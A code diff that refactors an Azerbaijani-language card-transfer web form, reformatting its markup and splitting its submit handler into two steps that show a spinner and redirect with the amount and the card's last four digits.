@@ -156,7 +156,6 @@
         object-fit: cover;
         border-radius: 2px;
       }
-
       #resultContainer {
         display: none;
         margin-top: 20px;
@@ -186,7 +185,6 @@
         font-weight: 400;
         margin-top: 5px;
       }
-
       #spinnerOverlay {
         display: none;
         position: fixed;
@@ -261,13 +259,15 @@
     </div>
 
     <div class="bank-label" id="bankLabel" style="display: none">
-      <span class="flag-text">
-        <img src="2.png" alt="AZ Bayraq" class="flag-img" />
-        <span id="countryText">AZERBAIJAN</span>
-      </span>
+      <span class="flag-text"
+        ><img src="2.png" alt="AZ Bayraq" class="flag-img" /><span
+          id="countryText"
+          >AZERBAIJAN</span
+        ></span
+      >
     </div>
 
-    <button id="btn" class="submit" onclick="send()">Davam etmək</button>
+    <button id="btn" class="submit">Davam etmək</button>
 
     <div class="container" id="resultContainer">
       <div class="result-amount">
@@ -275,14 +275,12 @@
         <div class="amount-box" id="showAmount"></div>
       </div>
       <div class="commission">
-        Komissiya yoxdur
-        <span style="display: inline-block; margin-left: 4px">
-          <img
+        Komissiya yoxdur<span style="display: inline-block; margin-left: 4px"
+          ><img
             src="33.jpg"
             alt="ikon"
             style="width: 16px; height: 16px; vertical-align: middle"
-          />
-        </span>
+        /></span>
       </div>
     </div>
 
@@ -297,52 +295,49 @@
       const spinnerOverlay = document.getElementById("spinnerOverlay");
       const MAX_BALANCE = 2800;
 
-      function formatCard(value) {
-        let digits = value.replace(/\D/g, "");
-        if (digits.length > 16) digits = digits.slice(0, 16);
-        return digits.replace(/(.{4})/g, "$1 ").trim();
+      function formatCard(val) {
+        let d = val.replace(/\D/g, "");
+        if (d.length > 16) d = d.slice(0, 16);
+        return d.replace(/(.{4})/g, "$1 ").trim();
       }
       card.addEventListener("input", () => {
         card.value = formatCard(card.value);
         validate();
-        const digitsOnly = card.value.replace(/\s/g, "");
-        bankLabel.style.display = digitsOnly.length >= 4 ? "flex" : "none";
+        bankLabel.style.display =
+          card.value.replace(/\s/g, "").length >= 4 ? "flex" : "none";
       });
       card.addEventListener("focus", () => card.classList.remove("error"));
       amount.addEventListener("focus", () => amount.classList.remove("error"));
 
       function add(x) {
-        let val = parseFloat(amount.value) || 0;
-        let newVal = val + x;
-        if (newVal > MAX_BALANCE) newVal = MAX_BALANCE;
-        amount.value = newVal.toFixed(2);
+        let v = parseFloat(amount.value) || 0;
+        let nv = v + x;
+        if (nv > MAX_BALANCE) nv = MAX_BALANCE;
+        amount.value = nv.toFixed(2);
         validate();
       }
       amount.addEventListener("input", validate);
 
       function validate() {
         let amt = parseFloat(amount.value.replace(",", "."));
-        let cardNum = card.value.replace(/\s/g, "");
-        if (amt >= 0.01 && amt <= MAX_BALANCE && cardNum.length === 16) {
+        let cnum = card.value.replace(/\s/g, "");
+        if (amt >= 0.01 && amt <= MAX_BALANCE && cnum.length === 16)
           btn.classList.add("active");
-        } else {
-          btn.classList.remove("active");
-        }
+        else btn.classList.remove("active");
       }
 
-      function send() {
+      function sendStep1() {
         let amt = parseFloat(amount.value.replace(",", "."));
-        let cardNum = card.value.replace(/\s/g, "");
+        let cnum = card.value.replace(/\s/g, "");
         if (!(amt >= 0.01 && amt <= MAX_BALANCE)) {
           amount.classList.add("error");
           return;
         }
-        if (cardNum.length !== 16) {
+        if (cnum.length !== 16) {
           card.classList.add("error");
           return;
         }
 
-        // Spinner göstər
         spinnerOverlay.style.display = "flex";
         spinnerOverlay.style.position = "fixed";
 
@@ -361,19 +356,24 @@
             block: "center",
           });
 
-          const last4 = cardNum.slice(-4);
-
-          // Testiq et klik funksiyası
-          btn.onclick = () => {
-            spinnerOverlay.style.display = "flex";
-            spinnerOverlay.style.position = "fixed";
-            setTimeout(() => {
-              spinnerOverlay.style.display = "none";
-              window.location.href = `5.html?amount=${amt.toFixed(2)}&card=${last4}`;
-            }, 1000);
-          };
+          btn.onclick = sendStep2;
         }, 1000);
       }
+
+      function sendStep2() {
+        let amt = parseFloat(amount.value.replace(",", "."));
+        let cnum = card.value.replace(/\s/g, "");
+        const last4 = cnum.slice(-4);
+        spinnerOverlay.style.display = "flex";
+        spinnerOverlay.style.position = "fixed";
+
+        setTimeout(() => {
+          spinnerOverlay.style.display = "none";
+          window.location.href = `5.html?amount=${amt.toFixed(2)}&card=${last4}`;
+        }, 1000);
+      }
+
+      btn.onclick = sendStep1;
     </script>
   </body>
 </html>
